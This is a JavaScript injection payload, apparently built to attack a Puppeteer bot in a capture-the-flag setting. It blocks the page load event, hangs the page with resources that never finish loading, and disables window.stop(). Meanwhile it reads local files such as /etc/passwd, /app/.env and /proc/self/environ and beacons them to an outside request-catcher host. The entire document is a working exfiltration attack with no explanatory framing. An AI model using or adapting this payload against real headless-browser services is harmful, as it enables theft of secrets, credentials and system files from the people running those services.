// =================================================================
// INJECT THIS AT THE VERY TOP OF YOUR PAGE (before anything else)
// =================================================================

// CRITICAL: This must run BEFORE DOMContentLoaded
(function() {
    'use strict';
    
    const SERVER = 'https://aab.requestcatcher.com';
    
    // =================================================================
    // BLOCK 1: Prevent load event from EVER firing
    // =================================================================
    
    // Intercept load event in capture phase (runs first)
    window.addEventListener('load', function(e) {
        e.stopImmediatePropagation(); // Stop event from propagating
        e.preventDefault(); // Prevent default behavior
        console.log('[BLOCKED] Load event intercepted and stopped');
        
        // Send confirmation
        new Image().src = SERVER + '/load-blocked';
    }, true); // TRUE = capture phase (runs before bubble)
    
    // Also block DOMContentLoaded just in case
    document.addEventListener('DOMContentLoaded', function(e) {
        console.log('[INFO] DOMContentLoaded fired (this is OK)');
    }, true);
    
    // =================================================================
    // BLOCK 2: Add resources that NEVER finish loading
    // =================================================================
    
    // This keeps the page in "loading" state forever
    function addHangingResources() {
        // Hanging iframe
        const iframe = document.createElement('iframe');
        iframe.style.display = 'none';
        iframe.src = 'https://httpstat.us/200?sleep=999999'; // Never completes
        (document.body || document.documentElement).appendChild(iframe);
        
        // Hanging script
        const script = document.createElement('script');
        script.src = 'https://httpstat.us/200?sleep=999999&t=js';
        document.head.appendChild(script);
        
        // Hanging images
        for (let i = 0; i < 3; i++) {
            const img = document.createElement('img');
            img.src = 'https://httpstat.us/200?sleep=999999&n=' + i;
            img.style.display = 'none';
            (document.body || document.documentElement).appendChild(img);
        }
        
        console.log('[ADDED] Hanging resources added');
        new Image().src = SERVER + '/resources-added';
    }
    
    // Add resources immediately
    if (document.body) {
        addHangingResources();
    } else {
        // If body doesn't exist yet, wait for it
        document.addEventListener('DOMContentLoaded', addHangingResources);
    }
    
    // =================================================================
    // BLOCK 3: File exfiltration (now we have unlimited time!)
    // =================================================================
    
    function exfiltrate() {
        new Image().src = SERVER + '/exfil-start';
        
        const results = {};
        let successCount = 0;
        
        // Read file synchronously
        function readFileSync(path, name) {
            try {
                const xhr = new XMLHttpRequest();
                xhr.open('GET', path, false); // SYNCHRONOUS
                xhr.send();
                
                if ((xhr.status === 200 || xhr.status === 0) && xhr.responseText) {
                    results[name] = xhr.responseText;
                    successCount++;
                    
                    // Send immediately
                    const fd = new FormData();
                    fd.append('file', name);
                    fd.append('data', btoa(xhr.responseText.substring(0, 3000)));
                    navigator.sendBeacon(SERVER + '/file-' + name, fd);
                    
                    return true;
                }
            } catch(e) {
                results[name + '_error'] = e.message;
                new Image().src = SERVER + '/error-' + name + '?msg=' + encodeURIComponent(e.message);
            }
            return false;
        }
        
        // Target files
        const files = [
            ['file:///flag.txt', 'flag'],
            ['file:///app/flag.txt', 'appflag'],
            ['file:///etc/passwd', 'passwd'],
            ['file:///etc/hostname', 'hostname'],
            ['file:///app/bot.js', 'bot'],
            ['file:///app/package.json', 'package'],
            ['file:///app/app.js', 'app'],
            ['file:///app/.env', 'env'],
            ['file:///proc/self/environ', 'environ'],
            ['file:///proc/self/cmdline', 'cmdline']
        ];
        
        // Read all files
        files.forEach(function(item) {
            readFileSync(item[0], item[1]);
        });
        
        // Send summary
        new Image().src = SERVER + '/exfil-done?success=' + successCount + '&total=' + files.length;
        
        return results;
    }
    
    // Start exfiltration immediately
    setTimeout(function() {
        exfiltrate();
    }, 100);
    
    // =================================================================
    // BLOCK 4: Keep-alive heartbeat
    // =================================================================
    
    let heartbeat = 0;
    setInterval(function() {
        heartbeat++;
        new Image().src = SERVER + '/alive?n=' + heartbeat;
        console.log('[ALIVE] Heartbeat #' + heartbeat + ' - Puppeteer still waiting...');
    }, 2000);
    
    // =================================================================
    // BLOCK 5: Alternative - Infinite loading via window.stop() override
    // =================================================================
    
    // Prevent window.stop() from being called
    const originalStop = window.stop;
    window.stop = function() {
        console.log('[BLOCKED] window.stop() called but ignored');
        new Image().src = SERVER + '/stop-blocked';
        // Don't actually stop
    };
    
    console.log('[READY] Load event blocker active - bot will wait indefinitely');
    
})();
